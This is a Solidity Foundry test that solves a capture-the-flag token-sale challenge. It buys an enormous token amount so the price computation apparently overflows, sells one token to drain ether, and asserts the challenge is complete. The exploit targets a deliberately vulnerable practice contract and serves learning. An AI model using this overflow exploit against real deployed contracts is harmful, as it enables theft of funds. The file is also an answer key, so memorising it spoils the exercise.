// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "forge-std/Test.sol";
import { TokenSaleChallengeFactory } from "../src/challenges/10_TokenSale/TokenSaleChallengeFactory.sol";

interface ITokenSaleChallenge {
    function isComplete() external returns (bool);

    function buy(uint256 numTokens) external payable;

    function sell(uint256 numTokens) external;
}

contract TokenSaleTest is Test {
    ITokenSaleChallenge challenge;

    function setUp() public {
        TokenSaleChallengeFactory factory = new TokenSaleChallengeFactory();
        address challengeAddress = factory.createChallenge{ value: 1 ether }();
        challenge = ITokenSaleChallenge(challengeAddress);
    }

    function test() public {
        challenge.buy(0x0001000000000000000000000000000000000000000000000000000000000000);
        challenge.sell(1);

        assertTrue(challenge.isComplete());
    }

    receive() external payable {}
}